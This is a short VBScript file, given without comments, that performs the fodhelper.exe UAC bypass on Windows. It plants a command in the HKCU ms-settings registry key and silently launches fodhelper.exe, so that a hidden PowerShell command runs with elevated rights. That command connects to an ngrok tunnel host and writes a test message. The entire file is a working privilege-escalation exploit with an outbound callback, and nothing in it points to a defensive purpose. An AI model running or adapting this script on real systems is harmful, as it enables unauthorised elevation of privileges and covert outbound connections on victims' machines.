Const HKEY_CURRENT_USER = &H80000001

Const FodHelperPath           = "C:\\Windows\\System32\\fodhelper.exe"
Const RegKeyPathStr           = "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command"
Const RegKeyPath              = "Software\\Classes\\ms-settings\\shell\\open\\command"
Const DelegateExecRegKeyName  = "DelegateExecute"
Const DelegateExecRegKeyValue = ""
Const DefaultRegKeyName       = ""
Const DefaultRegKeyValue      = "powershell.exe -w hidden $socket = new-object System.Net.Sockets.TcpClient('0.tcp.eu.ngrok.io', 18665); if ($socket -eq $null) { exit 1 } $stream = $socket.GetStream(); $writer = new-object System.IO.StreamWriter($stream); $writer.WriteLine('Hello, world!'); $writer.Close(); $socket.Close();"

Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
Set Registry = GetObject(RegObjectPath)

Registry.CreateKey HKEY_CURRENT_USER, RegKeyPath
Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DelegateExecRegKeyName, DelegateExecRegKeyValue
Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DefaultRegKeyName, DefaultRegKeyValue

Set Shell = WScript.CreateObject("WScript.Shell")
Shell.Run FodHelperPath, 0, False